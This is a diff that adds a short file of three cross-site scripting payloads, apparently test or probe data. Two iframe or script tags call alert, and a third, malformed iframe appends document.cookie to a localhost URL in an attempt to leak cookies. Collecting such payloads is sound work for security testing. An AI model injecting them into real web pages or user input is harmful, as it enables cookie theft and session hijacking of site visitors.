@@ -1,0 +1,6 @@
+<iframe src="javascript:alert(`xss`)">
+
+<script>alert(`XSS`)</script>
+
+<iframe src="http://localhost/" + document.cookie">
+
